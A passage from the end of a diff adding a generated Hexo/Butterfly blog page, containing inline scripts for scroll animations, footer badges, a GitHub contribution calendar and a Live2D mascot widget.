+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('article-sort-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__slideInRight');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow_init.js"></script><script data-pjax>
+  function butterfly_footer_beautify_injector_config(){
+    var parent_div_git = document.getElementById('footer-wrap');
+    var item_html = '<div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v5.4.0" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" data-title="主题版本Butterfly_v4.2.2" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender" alt=""/></a><a class="github-badge" target="_blank" href="https://www.jsdelivr.com/" style="margin-inline:5px" data-title="本站使用JsDelivr为静态资源提供CDN加速" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&amp;logo=jsDelivr" alt=""/></a><a class="github-badge" target="_blank" href="https://beian.miit.gov.cn/#/Integrated/index" style="margin-inline:5px" data-title="本站已在湘进行备案" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/湘ICP备-2022004213号-e1d492?style=flat&amp;logo=data:image/png;base64,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" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github托管" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub" alt=""/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&amp;logo=Claris" alt=""/></a></p>';
+    console.log('已挂载butterfly_footer_beautify')
+    parent_div_git.insertAdjacentHTML("beforeend",item_html)
+    }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_footer_beautify_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_footer_beautify_injector_config();
+  }
+  </script><script async src="/js/runtime/runtime.min.js"></script><script async src="/js/ali_font.js"></script><script data-pjax src="https://cdn.cbd.int/hexo-filter-gitcalendar/lib/gitcalendar.js"></script><script data-pjax>
+  function gitcalendar_injector_config(){
+      var parent_div_git = document.getElementById('recent-posts');
+      var item_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><style>#git_container{min-height: 280px}@media screen and (max-width:650px) {#git_container{min-height: 0px}}</style><div id="git_loading" style="width:10%;height:100%;margin:0 auto;display: block;"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animatetransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animatetransform></path></svg><style>#git_container{display: none;}</style></div><div id="git_container"></div></div>';
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+      console.log('已挂载gitcalendar')
+      }
+
+    if( document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
+        gitcalendar_injector_config()
+        GitCalendarInit("https://python-github-calendar-api-spk83h666-anzhiyu-c.vercel.app/api?ke1nys",['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'],'ke1nys')
+    }
+  </script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>
